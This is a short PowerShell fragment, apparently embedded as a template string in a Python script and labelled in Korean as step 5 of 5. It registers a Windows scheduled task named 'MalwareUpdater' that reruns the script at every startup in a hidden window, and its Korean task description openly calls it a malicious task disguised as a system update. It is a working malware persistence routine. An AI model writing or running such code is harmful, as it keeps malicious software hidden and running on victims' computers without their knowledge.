# PowerShell 스크립트 5: 작업 스케줄러 등록
Write-Host "➡️ PowerShell 스크립트 5/5: 작업 스케줄러 등록 중..."
$taskName = "MalwareUpdater"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File \\"{current_script_path}\\"" # 이 파이썬 스크립트 자신을 재실행
$trigger = New-ScheduledTaskTrigger -AtStartup
try {{
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "시스템 업데이트를 가장한 악성 작업" -Force
    Write-Host "   작업 스케줄러: '$taskName' 등록 완료!"
}} catch {{
    Write-Warning "   작업 스케줄러 등록 실패 (관리자 권한 필요): $_"
}}